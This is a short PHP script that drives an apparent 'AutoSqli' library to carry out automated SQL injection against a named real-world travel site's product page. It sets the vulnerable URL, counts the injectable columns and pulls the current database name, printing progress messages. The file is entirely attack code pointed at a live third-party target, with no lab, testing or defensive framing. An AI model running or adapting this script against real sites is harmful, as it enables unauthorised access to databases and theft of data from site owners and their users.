<?php

require "lib/AutoSqli.php";

$autosqli = new AutoSqli();

$autosqli->setUrl("http://www.easygosg.com/attraction-product.php?id=");

echo "[!] Target Url : " . $autosqli->getUrl() . "\n";

echo "[!] Prepare to get Columns...\n";
$autosqli->findnumbercolumn();

echo "[+] Number Columns: " . $autosqli->getnumbercolumn() . "\n";

echo "[!] Prepare to get Current Database...\n";
$autosqli->findcurrentdatabase();

echo "[+] Current Database: " . $autosqli->getcurrentdatabase() . "\n";
